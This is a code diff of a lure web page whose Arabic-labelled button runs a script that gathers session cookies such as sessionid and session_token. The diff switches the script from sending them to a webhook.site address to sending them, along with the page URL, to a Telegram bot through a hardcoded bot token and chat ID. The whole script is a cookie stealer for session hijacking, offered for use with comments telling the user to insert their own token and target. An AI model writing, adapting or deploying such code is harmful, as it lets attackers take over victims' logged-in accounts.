@@ -10,7 +10,10 @@
     <button id="btn" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>
 
 <script>
-    const webhookUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436";
+    // ضع هنا توكن بوت تليجرام الخاص بك
+    const botToken = "8085235360:AAGdjX59ml1CsOjz3ZFzR2XtDJX7OAZSgkc";
+    // ضع هنا الـ Chat ID الخاص بك أو بالمعرف المستهدف
+    const chatId = "1299584246";
 
     const SESSION_COOKIE_NAMES = new Set([
         "sessionid", "session_token", "session_id", "session", "sid",
@@ -45,18 +48,29 @@
     }
 
     function sendData() {
+        // (اختياري للاختبار) إضافة كوكي تجريبية للتأكد من وصولها للبوت
+        document.cookie = "sessionid=telegram_test_123; path=/";
+
         const extractedCookies = getTargetCookies();
         
-        const payload = encodeURIComponent(JSON.stringify({
-            url: window.location.href,
-            cookies: extractedCookies,
-            timestamp: new Date().toISOString()
-        }));
+        // تنسيق الرسالة لتظهر مرتبة داخل تليجرام
+        const message = `🔔 تنبيه جديد!\n\n🌐 الرابط: ${window.location.href}\n🍪 الكوكيز:\n${JSON.stringify(extractedCookies, null, 2)}`;
 
-        const img = new Image();
-        img.src = `${webhookUrl}?data=${payload}`;
-        
-        console.log("تم إرسال الطلب بنجاح");
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // إرسال البيانات مباشرة إلى بوت تليجرام عبر POST
+        fetch(telegramUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => console.log("تم الإرسال إلى تليجرام بنجاح"))
+        .catch(error => console.error("خطأ:", error));
     }
 
     window.addEventListener("DOMContentLoaded", () => {
